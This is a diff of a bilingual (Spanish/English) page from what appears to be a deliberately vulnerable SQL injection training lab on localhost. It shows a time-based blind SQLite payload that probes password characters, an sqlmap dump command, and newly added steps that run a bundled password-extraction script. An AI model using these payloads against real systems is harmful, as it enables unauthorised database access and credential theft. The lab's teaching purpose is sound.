@@ -81,6 +81,10 @@
         <pre>' AND (SELECT CASE WHEN (SUBSTR(password_plain,1,1)='a') THEN randomblob(300000000) ELSE '' END) IS NOT ''</pre></li>
       <li>Automatiza con sqlmap especificando las técnicas blind:
         <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --technique=BT --level=3 --risk=2 --dump</pre></li>
+      <li>Automatiza la extracción time-based con el script incluido:
+        <pre>python3 static/scripts/sqli_timebased_extractor.py http://localhost:5000</pre>
+        <div class="text-xs text-gray-400 mt-1">El script detecta automáticamente la IP/URL objetivo y extrae la contraseña usando retardos de tiempo.</div>
+      </li>
     </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
@@ -128,6 +132,10 @@
         <!-- Ejemplo eliminado porque produce error en SQLite si no se usa UNION SELECT con 5 columnas -->
       <li>Automate with sqlmap specifying blind techniques:
         <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --technique=BT --level=3 --risk=2 --dump</pre></li>
+      <li>Automate time-based extraction with the included script:
+        <pre>python3 static/scripts/sqli_timebased_extractor.py http://localhost:5000</pre>
+        <div class="text-xs text-gray-400 mt-1">The script auto-completes the target IP/URL and extracts the password using time delays.</div>
+      </li>
     </ol>
     <h3>Tools</h3>
     <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
